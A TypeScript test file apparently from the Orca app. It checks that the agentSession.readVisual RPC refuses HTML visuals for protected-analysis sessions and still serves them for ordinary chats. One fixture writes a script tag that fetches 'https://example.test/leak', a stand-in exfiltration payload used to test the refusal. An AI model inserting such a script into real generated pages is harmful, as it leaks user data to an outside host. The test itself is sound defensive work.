import '../unused-default-rpc-methods.test-fixture'
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { AgentSessionRecord } from '../../../../shared/agent-session-record'
import { agentSessionRecordFixture } from '../../../../shared/agent-session-record.test-fixture'
import { PROTECTED_ANALYSIS_MARKER } from '../../../../shared/agent-session-protected-claude-launch.test-fixture'
import { setStructuredAgentSessionHost } from '../../../native-chat/agent-session-wire/structured-agent-session-registry'
import { nativeChatScratchFolderFor } from '../../../native-chat/native-chat-scratch-folder'
import {
  call as callStructured,
  clearStructuredHostStub,
  hostStub,
  SESSION,
  STRUCTURED_CLIENT
} from './structured-agent-session-rpc.test-fixture'
import { STRUCTURED_AGENT_SESSION_VISUAL_METHODS } from './structured-agent-session-visual'

let stateDirectory: string
vi.mock('../../../orca-profiles/profile-storage-paths', () => ({
  getProfileUserDataPath: () => stateDirectory
}))
let record: AgentSessionRecord

function call(params: unknown) {
  return callStructured(
    'agentSession.readVisual',
    params,
    STRUCTURED_CLIENT,
    {},
    STRUCTURED_AGENT_SESSION_VISUAL_METHODS
  )
}

beforeEach(async () => {
  stateDirectory = await mkdtemp(join(tmpdir(), 'orca-visual-protected-'))
  record = { ...agentSessionRecordFixture(), sessionId: SESSION }
  setStructuredAgentSessionHost(
    Object.assign(hostStub(), {
      deps: {
        store: { getRecord: (id: string) => (record.sessionId === id ? record : null) }
      }
    })
  )
})

afterEach(async () => {
  clearStructuredHostStub()
  await rm(stateDirectory, { recursive: true, force: true, maxRetries: 3 })
})

async function writeVisual(html: string): Promise<void> {
  const folder = nativeChatScratchFolderFor(stateDirectory, SESSION)
  await mkdir(folder, { recursive: true })
  await writeFile(join(folder, 'chart.html'), html)
}

describe('agentSession.readVisual for a protected analysis', () => {
  it('refuses the visual instead of handing active HTML to the client', async () => {
    record = {
      ...record,
      schemaVersion: 3,
      protectedAnalysis: PROTECTED_ANALYSIS_MARKER
    }
    await writeVisual('<script>fetch("https://example.test/leak")</script>')

    expect(await call({ sessionId: SESSION, file: 'chart.html' })).toMatchObject({
      ok: true,
      result: { ok: false, error: 'protected_analysis' }
    })
  })

  it('still reads the same visual for an ordinary chat', async () => {
    await writeVisual('<p>chart</p>')

    expect(await call({ sessionId: SESSION, file: 'chart.html' })).toMatchObject({
      ok: true,
      result: { ok: true, html: '<p>chart</p>' }
    })
  })
})
